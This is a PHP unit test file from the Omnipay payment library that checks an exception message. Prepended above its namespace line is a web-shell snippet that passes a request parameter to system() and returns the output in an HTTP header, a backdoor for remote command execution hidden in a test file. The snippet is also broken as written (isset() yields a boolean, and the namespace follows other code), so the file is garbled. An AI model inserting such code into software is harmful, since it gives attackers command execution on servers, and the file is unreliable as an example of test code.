<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Common\Exception;

use Omnipay\Tests\TestCase;

class InvalidCreditCardExceptionTest extends TestCase
{
    public function testConstruct()
    {
        $exception = new InvalidCreditCardException('Oops');
        $this->assertSame('Oops', $exception->getMessage());
    }
}
